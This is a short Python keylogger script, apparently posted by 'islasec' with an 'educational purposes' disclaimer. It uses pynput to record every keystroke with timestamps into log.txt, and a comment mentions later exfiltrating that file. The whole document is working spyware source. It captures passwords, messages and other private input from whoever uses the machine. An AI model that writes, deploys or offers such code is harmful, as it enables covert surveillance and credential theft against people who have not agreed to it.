## Simple Key Logging tool


# Import needed Libraries

from pynput.keyboard import Key, Listener    # This will help us read the keystrokes as the user types in stuff
import logging #
import pyfiglet  # This will log the key strokes into a file which we can later exfiltrate by suitable means


banner1 = pyfiglet.figlet_format("S I M P L E")
banner2 = pyfiglet.figlet_format("KEY LOGGER")
print("islasec's")
print(banner1)
print(banner2)
print("Strictly for educational purposes and it shouldn’t be for EVIL")
print("loading...")
print("loading...")
print("loading...")
print("Recording!")
 
logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") # Wreate basic configuration for the logging system. We specify the filename where keystrokes will be logged followed by the format in which the keystrokes will be stored, the time of event and the keys:
 
def on_press(key):  # Define the function here to ttake an argument of a key pressed by the user and...  
    logging.info(str(key))  # record it into the specified file after converting it into a string.
 
with Listener(on_press=on_press) as listener :  # here we create an instance of a Listener which would be recording key strokes and pass the function we created as an argument
    listener.join()  # Then we use the .join() method to join it to the main thread.
    
# Everytime a key is pressed, the listener is triggered and it calls our function which then logs our keystrokes into the file.
